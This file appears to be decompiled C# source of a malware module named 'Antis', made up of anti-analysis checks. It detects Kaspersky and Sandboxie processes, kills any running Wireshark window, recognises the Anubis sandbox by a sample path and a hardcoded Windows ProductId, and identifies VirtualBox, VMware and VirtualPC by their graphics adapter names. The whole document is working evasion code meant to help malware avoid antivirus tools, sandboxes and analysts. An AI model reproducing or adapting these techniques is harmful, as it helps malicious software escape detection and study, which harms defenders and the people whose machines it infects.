using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

[StandardModule]
internal sealed class Antis
{
	private static object Devices;

	private static string Grafikadapter;

	private static string RegionA = "SELECT * FROM Win32_VideoController";

	private static RegistryKey regPID = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", writable: false);

	private static object pid = RuntimeHelpers.GetObjectValue(regPID.GetValue("ProductId"));

	private static string id = "76487-337-8429955-22614";

	public static bool antiKAV()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					flag = Process.GetProcessesByName("avp").Length >= 1;
					goto end_IL_0000;
				case 37:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0000;
					}
					break;
				}
				goto IL_005b;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 37;
				continue;
			}
			break;
			IL_005b:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void AntiWireShark()
	{
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			string mainWindowTitle = process.MainWindowTitle;
			if (string.Equals(mainWindowTitle, "The Wireshark Network Analyzer"))
			{
				process.Kill();
			}
		}
	}

	public static bool antiSandboxie()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					flag = Process.GetProcessesByName("SbieSvc").Length >= 1;
					goto end_IL_0000;
				case 37:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0000;
					}
					break;
				}
				goto IL_005b;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 37;
				continue;
			}
			break;
			IL_005b:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static bool antiAnubis()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					string startupPath = Application.get_StartupPath();
					string text = startupPath + "\\sample.exe";
					flag = ((Operators.CompareString(Application.get_ExecutablePath(), text, false) == 0) ? true : false);
					goto end_IL_0000;
				}
				case 55:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0000;
					}
					break;
				}
				goto IL_006f;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 55;
				continue;
			}
			break;
			IL_006f:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static bool antiAnubis2()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					flag = (Operators.ConditionalCompareObjectEqual(pid, (object)id, false) ? true : false);
					goto end_IL_0000;
				case 40:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0000;
					}
					break;
				}
				goto IL_005e;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 40;
				continue;
			}
			break;
			IL_005e:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static bool AntiVirtualBox()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					getDevices();
					string grafikadapter = Grafikadapter;
					flag = ((Operators.CompareString(grafikadapter, "VirtualBox Graphics Adapter", false) == 0) ? true : false);
					goto end_IL_0000;
				}
				case 48:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0000;
					}
					break;
				}
				goto IL_0066;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 48;
				continue;
			}
			break;
			IL_0066:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static bool AntiVmWare()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					getDevices();
					string grafikadapter = Grafikadapter;
					flag = ((Operators.CompareString(grafikadapter, "VMware SVGA II", false) == 0) ? true : false);
					goto end_IL_0000;
				}
				case 48:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0000;
					}
					break;
				}
				goto IL_0066;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 48;
				continue;
			}
			break;
			IL_0066:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static bool AntiVirtualPC()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					getDevices();
					string grafikadapter = Grafikadapter;
					flag = ((Operators.CompareString(grafikadapter, "VM Additions S3 Trio32/64", false) == 0) ? true : false);
					goto end_IL_0000;
				}
				case 48:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0000;
					}
					break;
				}
				goto IL_0066;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 48;
				continue;
			}
			break;
			IL_0066:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private static void getDevices()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					object @object = Interaction.GetObject("winmgmts:", (string)null);
					object[] array = new object[1] { RegionA };
					bool[] array2 = new bool[1] { true };
					object obj = NewLateBinding.LateGet(@object, (Type)null, "ExecQuery", array, (string[])null, (Type[])null, array2);
					if (array2[0])
					{
						RegionA = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
					}
					Devices = RuntimeHelpers.GetObjectValue(obj);
					IEnumerator enumerator = ((IEnumerable)Devices).GetEnumerator();
					while (enumerator.MoveNext())
					{
						object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
						Grafikadapter = Conversions.ToString(NewLateBinding.LateGet(objectValue, (Type)null, "Description", new object[0], (string[])null, (Type[])null, (bool[])null));
					}
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
					goto end_IL_0000;
				}
				case 212:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0000;
					}
					break;
				}
				goto IL_010e;
				end_IL_0000:;
			}
			catch (object obj2) when (obj2 is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0000_dispatch = 212;
				continue;
			}
			break;
			IL_010e:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
